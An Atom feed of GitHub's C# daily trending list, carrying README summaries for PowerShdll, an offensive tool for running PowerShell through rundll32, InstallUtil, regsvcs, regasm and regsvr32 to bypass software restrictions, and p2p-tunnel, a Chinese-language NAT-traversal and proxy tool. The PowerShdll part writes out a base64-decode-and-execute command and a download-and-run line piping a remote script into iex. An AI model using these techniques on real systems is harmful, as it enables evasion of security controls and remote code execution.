<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-04-15T02:41:56Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>p3nt4/PowerShdll</title>
    <updated>2023-04-15T02:41:56Z</updated>
    <id>tag:github.com,2023-04-15:/p3nt4/PowerShdll</id>
    <link href="https://github.com/p3nt4/PowerShdll" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Run PowerShell with rundll32. Bypass software restrictions.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PowerShdll&lt;/h1&gt; &#xA;&lt;p&gt;Run PowerShell with dlls only.&lt;/p&gt; &#xA;&lt;p&gt;Does not require access to powershell.exe as it uses powershell automation dlls.&lt;/p&gt; &#xA;&lt;p&gt;PowerShdll can be run with: rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe or as a standalone executable.&lt;/p&gt; &#xA;&lt;h2&gt;dll mode:&lt;/h2&gt; &#xA;&lt;h3&gt;Rundll32:&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage:&#xA;rundll32 PowerShdll,main &amp;lt;script&amp;gt;&#xA;rundll32 PowerShdll,main -h      Display this message&#xA;rundll32 PowerShdll,main -f &amp;lt;path&amp;gt;       Run the script passed as argument&#xA;rundll32 PowerShdll,main -w      Start an interactive console in a new window (Default)&#xA;rundll32 PowerShdll,main -i      Start an interactive console in this console&#xA;If you do not have an interractive console, use -n to avoid crashes on output&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Alternatives (Credit to SubTee for these techniques):&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;1. &#xA;    x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll&#xA;    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll&#xA;2. &#xA;    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe PowerShdll.dll&#xA;    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe PowerShdll.dll&#xA;3. &#xA;    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U PowerShdll.dll&#xA;    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U PowerShdll.dll&#xA;4. &#xA;    regsvr32 /s  /u PowerShdll.dll --&amp;gt;Calls DllUnregisterServer&#xA;    regsvr32 /s PowerShdll.dll --&amp;gt; Calls DllRegisterServer&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;exe mode&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage:&#xA;PowerShdll.exe &amp;lt;script&amp;gt;&#xA;PowerShdll.exe -h      Display this message&#xA;PowerShdll.exe -f &amp;lt;path&amp;gt;       Run the script passed as argument&#xA;PowerShdll.exe -i      Start an interactive console in this console (Default)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Embeded payloads&lt;/h2&gt; &#xA;&lt;p&gt;Payloads can be embeded by modifying the &#34;payload&#34; variable in the start method of the common.cs file. If a payload is embeded, all other varguments will be ignored and the payload will be executed upon running PowerShdll.&lt;/p&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;h3&gt;Run base64 encoded script&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;rundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String(&#34;BASE64&#34;)) ^| iex&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: Empire stagers need to be decoded using [System.Text.Encoding]::Unicode&lt;/p&gt; &#xA;&lt;h3&gt;Download and run script&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;.Net v3.5 for dll mode.&lt;/li&gt; &#xA; &lt;li&gt;.Net v2.0 for exe mode.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Known Issues&lt;/h2&gt; &#xA;&lt;p&gt;Some errors do not seem to show in the output. May be confusing as commands such as Import-Module do not output an error on failure. Make sure you have typed your commands correctly.&lt;/p&gt; &#xA;&lt;p&gt;In dll mode, interractive mode and command output rely on hijacking the parent process&#39; console. If the parent process does not have a console, use the -n switch to not show output otherwise the application will crash.&lt;/p&gt; &#xA;&lt;p&gt;Due to the way Rundll32 handles arguments, using several space characters between switches and arguments may cause issues. Multiple spaces inside the scripts are okay.&lt;/p&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;This project is intended for security researchers and penetration testers and should only be used with the approval of system owners.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>snltty/p2p-tunnel</title>
    <updated>2023-04-15T02:41:56Z</updated>
    <id>tag:github.com,2023-04-15:/snltty/p2p-tunnel</id>
    <link href="https://github.com/snltty/p2p-tunnel" rel="alternate"></link>
    <summary type="html">&lt;p&gt;.NET7 Socket NAT transfer，UDP,TCP punch hole，tcp forward，udp forward，http1.1 proxy，socks5 proxy，networking&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/snltty/p2p-tunnel/master/readme/logo.svg?sanitize=true&#34; height=&#34;150&#34;&gt;&lt;/p&gt; &#xA; &lt;h1&gt;p2p-tunnel&lt;/h1&gt; &#xA; &lt;h4&gt;Visual Studio 2022 LTSC 17.4.1&lt;/h4&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://jq.qq.com/?_wv=1027&amp;amp;k=ucoIVfz4&#34; target=&#34;_blank&#34;&gt;QQ 群：1121552990&lt;/a&gt; | &lt;a href=&#34;https://www.bilibili.com/video/BV14M4y117MB&#34;&gt;介绍视频&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://img.shields.io/github/stars/snltty/p2p-tunnel?style=social&#34; alt=&#34;GitHub Repo stars&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/forks/snltty/p2p-tunnel?style=social&#34; alt=&#34;GitHub Repo forks&#34;&gt; &lt;a href=&#34;https://gitee.com/snltty/p2p-tunnel/stargazers&#34;&gt;&lt;img src=&#34;https://gitee.com/snltty/p2p-tunnel/badge/star.svg?theme=dark&#34; alt=&#34;star&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://gitee.com/snltty/p2p-tunnel/members&#34;&gt;&lt;img src=&#34;https://gitee.com/snltty/p2p-tunnel/badge/fork.svg?theme=dark&#34; alt=&#34;fork&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;使用前请确保你已知其中风险&lt;/p&gt; &#xA; &lt;p&gt;本软件仅供学习交流，请勿用于违法犯罪&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;由来理念&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;这是一个内网穿透项目，包括p2p打洞穿透，服务器代理穿透，还包含了一些有趣的功能&lt;/li&gt; &#xA; &lt;li&gt;之前用了一些穿透工具，存在一些问题 &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;有go的，rust的，c++的，都看不太懂，不好加自己需要的功能&lt;/li&gt; &#xA;   &lt;li&gt;.NET平台的极少，且，或仅支持服务器代理穿透，或内存占用量非常大(100MB+)，都不是很符合自己的期望&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;基于这些有的没的，就决定了自己实现，做一个自己喜欢的内网穿透工具，也是为了学习网络协议相关知识&lt;/li&gt; &#xA; &lt;li&gt;除了rudp(&lt;a href=&#34;https://github.com/RevenantX/LiteNetLib&#34; target=&#34;_blank&#34;&gt;LiteNetLib&lt;/a&gt;)，其它代码都是手写，所以代码量，内存占用率，都比较小，速度也比较快。&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;大致原理&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/snltty/p2p-tunnel/master/readme/path.jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;一些说明&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【内网穿透】&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;TCP、UDP打洞，(&lt;a href=&#34;https://github.com/RevenantX/LiteNetLib&#34; target=&#34;_blank&#34;&gt;LiteNetLib rudp&lt;/a&gt;) &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;A客户端&amp;lt;--&amp;gt;B客户端&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;服务器中继 &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;A客户端&amp;lt;--&amp;gt;服务器&amp;lt;--&amp;gt;B客户端&lt;/li&gt; &#xA;     &lt;li&gt;中继不参与打包解包，仅网络消耗&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;节点中继 &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;A客户端&amp;lt;--&amp;gt;某客户端(中间任意数量)&amp;lt;--&amp;gt;B客户端&lt;/li&gt; &#xA;     &lt;li&gt;中继不参与打包解包，仅网络消耗&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;服务器代理 &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;服务器&amp;lt;--&amp;gt;A客户端&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【.NET7】&lt;/strong&gt; 跨平台，高性能，小尺寸，小内存&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/snltty/p2p-tunnel/master/readme/size.jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【UI界面】&lt;/strong&gt; 简单易用的web管理页面&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/snltty/p2p-tunnel/master/readme/ui.jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【高效】&lt;/strong&gt; 高效的打包解包，作死的全手写序列化，通信速度极佳，iperf3 原端口5201，和经过tcp转发的 11111 端口的测试结果&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/snltty/p2p-tunnel/master/readme/speed.jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【加密】&lt;/strong&gt; 支持通信数据加密(预配置密钥或自动交换密钥)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【插件式】&lt;/strong&gt; 可扩展的插件式&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【自建服务器】&lt;/strong&gt; 自建服务器则可开启 服务器代理穿透，服务器中继&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 免费的打洞服务器&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; android app&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;内置功能&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【账号管理】&lt;/strong&gt; 简单的权限配置 &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 到期时间&lt;/li&gt; &#xA;   &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 登入数限制(同一账号同时登入数量)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; 权限分配&lt;/li&gt; &#xA;   &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; 流量限制&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【tcp转发】&lt;/strong&gt; 转发tcp协议 &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(访问端,访问127.0.0.1:11111) &amp;lt;----&amp;gt; A客户端(监听11111端口) &amp;lt;--打洞/服务器中继/节点中继--&amp;gt; B客户端&amp;lt;----&amp;gt; 内网服务(8088端口)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【udp转发】&lt;/strong&gt; 转发udp协议 &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(访问端,访问127.0.0.1:11111) &amp;lt;----&amp;gt; A客户端(监听11111端口) &amp;lt;--打洞/服务器中继/节点中继--&amp;gt; B客户端&amp;lt;----&amp;gt; 内网服务(8088端口)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【http代理】&lt;/strong&gt; 以节点或者服务端作为代理目标 &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(访问端,访问www.domain.com) &amp;lt;----&amp;gt; A客户端 &amp;lt;--打洞/服务器中继/节点中继--&amp;gt; B客户端 &amp;lt;----&amp;gt; 外网服务(&lt;a href=&#34;http://www.domain.com&#34;&gt;www.domain.com&lt;/a&gt;)&lt;/li&gt; &#xA;   &lt;li&gt;(访问端,访问www.domain.com) &amp;lt;----&amp;gt; A客户端 &amp;lt;----&amp;gt; 服务器 &amp;lt;----&amp;gt; 外网服务(&lt;a href=&#34;http://www.domain.com&#34;&gt;www.domain.com&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【socks5代理】&lt;/strong&gt; 以节点或者服务端作为代理目标 &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(访问端,访问www.domain.com) &amp;lt;----&amp;gt; A客户端 &amp;lt;--打洞/服务器中继/节点中继--&amp;gt; B客户端 &amp;lt;----&amp;gt; 外网服务(&lt;a href=&#34;http://www.domain.com&#34;&gt;www.domain.com&lt;/a&gt;)&lt;/li&gt; &#xA;   &lt;li&gt;(访问端,访问www.domain.com) &amp;lt;----&amp;gt; A客户端 &amp;lt;----&amp;gt; 服务器 &amp;lt;----&amp;gt; 外网服务(&lt;a href=&#34;http://www.domain.com&#34;&gt;www.domain.com&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;strong&gt;【虚拟网卡组网】&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;(访问端,访问192.168.54.2:8088) &amp;lt;----&amp;gt; A客户端(192.168.54.1) &amp;lt;--打洞/服务器中继/节点中继--&amp;gt; B客户端(192.168.54.2)&amp;lt;----&amp;gt; 内网服务(8088端口)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/xjasonlyu/tun2socks&#34; target=&#34;_blank&#34;&gt;tun2socks&lt;/a&gt;虚拟网卡组网，让你的多个不同内网客户端组成一个网络，通过其ip访问，更有局域网网段绑定，访问目标局域网任意设备(&lt;strong&gt;暂时仅支持windows、linux、osx&lt;/strong&gt;)，如果无法运行虚拟网卡软件，你可能得自行下载对应系统及cpu版本的软件进行同名替换 &lt;a href=&#34;https://github.com/xjasonlyu/tun2socks/releases&#34; target=&#34;_blank&#34;&gt;tun2socks下载&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;部署运行&lt;/h2&gt; &#xA;&lt;h4&gt;windows 可使用托盘程序&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;client.service.tray.exe //客户端&lt;/li&gt; &#xA; &lt;li&gt;server.service.tray.exe //服务端&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;linux 按你喜欢的方式进行托管&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/snltty/p2p-tunnel/master/readme/server-linux.md&#34;&gt;服务端 linux docker托管&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/snltty/p2p-tunnel/master/readme/client-linux.md&#34;&gt;客户端 linux supervisor托管&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;服务端docker镜像 &lt;strong&gt;snltty/p2p-tunnel-server&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;客户端端docker镜像 &lt;strong&gt;snltty/p2p-tunnel-client&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;支持作者&lt;/h2&gt; &#xA;&lt;p&gt;请作者喝一杯咖啡，使其更有精力更新代码&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/snltty/p2p-tunnel/master/readme/qr.jpg&#34;&gt;&lt;/p&gt;</summary>
  </entry>
</feed>